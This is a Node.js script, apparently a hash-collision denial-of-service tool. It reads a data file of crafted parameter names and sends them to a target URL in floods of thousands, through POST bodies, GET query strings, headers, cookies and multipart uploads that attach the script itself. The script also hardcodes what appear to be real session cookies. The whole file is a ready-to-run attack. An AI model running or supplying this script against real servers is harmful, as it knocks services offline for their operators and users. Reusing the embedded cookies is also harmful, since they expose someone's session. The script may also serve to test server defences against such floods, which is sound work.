var http = require('http');
var fs = require('fs');
var urlparse = require('url').parse;

var data = fs.readFileSync('./hac-attack-data.txt').toString();

function attack(url, method) {
  method = method || 'post';
  var info = urlparse(url);
  var cookie = 'cookie2=a19b1fd65f535279b1639fd6342fb0f5;dtc_gc=1c676b0f29398d69ab5b504e8631abf6;dtc_nick=bocean;_nk_=%5Cu51B7%5Cu84DD%5Cu7684%5Cu8C03%5Cu8C03;';
  var options = {
    host: info.hostname,
    port: info.port || 80,
    path: info.path,
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Content-Length': data.length,
      'Cookie': cookie
    },
    method: 'POST'
  };
  var body = data;
  if (method === 'upload') {
    var args = uploadArgs();
    options.headers = args.headers;
    options.headers['Cookie'] = cookie;
    body = args.body;
    options.method = args.method;
  } else if (method === 'get') {
    options.method = 'GET';
    delete options.headers['Content-Type'];
    delete options.headers['Content-Length'];
    var d = data.substring(0, 2000);
    console.log('%d pairs', d.split('=&').length);
    options.path += '?' + d;
    // console.log(options)
  } else if (method === 'header') {
    options.method = 'GET';
    delete options.headers['Content-Type'];
    delete options.headers['Content-Length'];
    var pairs = data.split('=&');
    for (var i = 0, l = pairs.length; i < l; i++) {
      options.headers[pairs[i]] = '' + i;
      if (i > 4000) {
        break;
      }
    }
  } else if (method === 'cookie') {
    var pairs = data.split('&');
    var cookies = '';
    for (var i = 0, l = pairs.length; i < l; i++) {
      cookies += pairs[i] + i + ';';
      if (i > 5000) {
        break;
      }
    }
    options.headers['Cookie'] = cookies;
    options.method = 'GET';
  }
  var attackName = method + ' attack ' + url;
  // console.log('%s start...', attackName);
  var start = new Date();
  var req = http.request(options, function(res) {
    // console.log('%s Status %d %j', attackName, res.statusCode, res.headers)
    // console.log('%s Status %d', attackName, res.statusCode)
    res.on('data', function(chunk) {
      console.log('------------------------------------------------\n', 
        chunk.toString().substring(0, 1000).split('\n', 3).join('\n'))
    });
    res.on('end', function() {
      var ms = new Date() - start;
      console.log('%s %d %d ms', attackName, res.statusCode, ms);
    });
  });

  req.on('error', function(e) {
    console.log('problem at %s: %s', attackName, e);
  });

  // write data to request body
  req.write(body);
  req.end();

  // console.log('%s has sent', attackName);
}

function uploadArgs() {
  var headers = {};
  var boundary = 'boundary' + (new Date).getTime();
  var dashdash = '--';
  var crlf = '\r\n';

  /* Build RFC2388 string. */
  var builder = '';

  builder += dashdash;
  builder += boundary;
  builder += crlf;
  
  var args = data.split('=&', 24000);
  for (var i = 0, l = args.length; i < l; i++) {
    var key = args[i];
    /* Generate headers. key */            
    builder += 'Content-Disposition: form-data; name="' + key + '"';
    builder += crlf;
    builder += crlf; 
     /* Append form data. */
    builder += i;
    builder += crlf;
    
    /* Write boundary. */
    builder += dashdash;
    builder += boundary;
    builder += crlf;
  }
  /* Generate headers. file */            
  builder += 'Content-Disposition: form-data; name="upload"; filename="attack.js"';
  builder += crlf;

  builder += 'Content-Type: text/javascript;'; 
  builder += crlf;
  builder += crlf;

  // console.log(builder)
  
  // 处理文件内容
  var file_buffer = fs.readFileSync('./attack.js');
  var endstr = crlf + dashdash + boundary + dashdash +  crlf 
    , buffer = null;
  var builderLength = new Buffer(builder).length;
  var size = builderLength + file_buffer.length + endstr.length;
  buffer = new Buffer(size);
  var offset = 0;
  buffer.write(builder);
  offset += builderLength ;
  file_buffer.copy(buffer, offset);
  offset += file_buffer.length;
  buffer.write(endstr, offset);
  headers['Content-Type'] = 'multipart/form-data;boundary=' + boundary;
  headers['Content-Length'] = buffer.length;
  console.log('Upload %d bytes', buffer.length)
  return {
    body: buffer,
    headers: headers,
    method: 'POST'
  }
}

// Usage: node attack.js http://localhost:8080/ [post|get|upload|header]
// attack(process.argv[2], process.argv[3]);

if (!process.argv[3]) {
  var methods = ['get', 'post', 'header', 'upload', 'cookie'];
  methods.forEach(function(m) {
    attack(process.argv[2], m);
  });
} else {
  attack(process.argv[2], process.argv[3]);
}

